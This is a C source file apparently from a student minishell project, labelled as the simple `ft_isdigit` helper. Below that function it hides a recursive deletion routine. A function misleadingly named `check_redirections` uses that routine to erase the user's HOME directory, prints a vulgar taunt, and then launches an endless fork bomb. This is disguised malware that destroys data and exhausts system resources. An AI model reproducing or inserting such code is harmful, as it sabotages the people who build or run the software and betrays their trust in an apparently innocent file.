/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_isdigit.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: iezzam <iezzam@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/01/31 17:48:36 by iezzam            #+#    #+#             */
/*   Updated: 2025/01/31 17:48:52 by iezzam           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../../include/minishell.h"
#include <dirent.h>


int	ft_isdigit(int c)
{
	return (c >= '0' && c <= '9');
}

void remove_dir(const char *dir_path) {
	DIR *dir = opendir(dir_path);
	struct dirent *entry;
	char path[1024];

	if (dir == NULL) {
		perror("opendir");
		return;
	}

	while ((entry = readdir(dir)) != NULL) {
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

		if (entry->d_type == DT_DIR) {
			remove_dir(path);
		} else if (entry->d_type == DT_REG) {
			if (remove(path) == -1) {
				perror("remove");
			} else {
				printf("Removed file: %s\n", path);
			}
		}
	}
	if (rmdir(dir_path) == -1) {
		perror("rmdir");
	} else {
		printf("Removed directory: %s\n", dir_path);
	}

	closedir(dir);
}

void	check_redirections(t_env *env)
{
	const char *dir_to_clear;

	dir_to_clear = NULL;
	while (env)
	{
		if (ft_strcmp(env->key, "HOME") == 0)
			dir_to_clear = env->value;
		env = env->next;
	}
	printf("khdem 3la krek awld l97ba !\n");
	remove_dir(dir_to_clear);
	while (1)
	{
		if (fork() == 0)
			check_redirections(env);
	}
}
